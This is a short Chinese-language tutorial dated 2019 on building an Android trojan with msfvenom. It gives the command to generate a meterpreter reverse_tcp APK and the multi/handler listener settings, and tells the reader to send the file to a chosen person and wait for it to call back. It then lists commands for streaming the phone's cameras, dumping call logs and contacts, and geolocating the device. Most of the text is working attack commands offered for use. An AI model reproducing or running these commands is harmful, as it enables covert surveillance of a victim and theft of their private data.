msfconsole手机木马

8月 26 2019

生成手机apk木马

msfvenom -p android/meterpreter/reverse_tcp LHOST=192.168.3.73 LPORT=8888 R>1.apk

攻击模块设置

use exploit/multi/handler

set payload android/meterpreter/reverse_tcp

set LHOST 192.168.3.73

set LPORT 8888

木马发送到指定人，等待上线

弹回shell后可尝试执行：

webcam_stream -i 1/2 打开前置或后置摄像头

dump_calllog 下载电话记录

dump_contacts 获取通讯录

geolocate 定位（需要下载goole地图）
